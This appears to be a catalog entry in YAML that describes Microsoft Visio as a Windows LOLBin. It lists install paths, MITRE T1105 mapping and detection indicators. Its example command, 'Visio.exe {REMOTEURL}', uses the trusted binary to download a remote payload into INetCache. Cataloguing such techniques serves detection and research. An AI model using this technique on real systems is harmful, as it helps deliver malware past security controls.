---
id: windows-download-visio
namespace: windows:download:visio
name: visio
description: 'Microsoft Visio Executable Located at: C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe; C:\Program Files\Microsoft Office\Office14\Visio.exe; C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe.'
author: Avihay Eldad
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- visio
parameters: []
features: []
execution:
  template: visio
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Downloads payload from remote server (It will download a remote payload and place it in INetCache.)
  command: Visio.exe {REMOTEURL}
references: []
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: ioc
  description: URL on a visio.exe command line
- type: ioc
  description: visio.exe making unexpected network connections or DNS requests
install:
- method: choco
  package_name: visio
  commands:
  - choco install visio
---


# visio

visio is a Windows LOLBin. Microsoft Visio Executable Located at: C:\Program Files (x86)\Microsoft Office\Office14\Visio.exe; C:\Program Files\Microsoft Office\Office14\Visio.exe; C:\Program Files (x86)\Microsoft Office\Office15\Visio.exe.
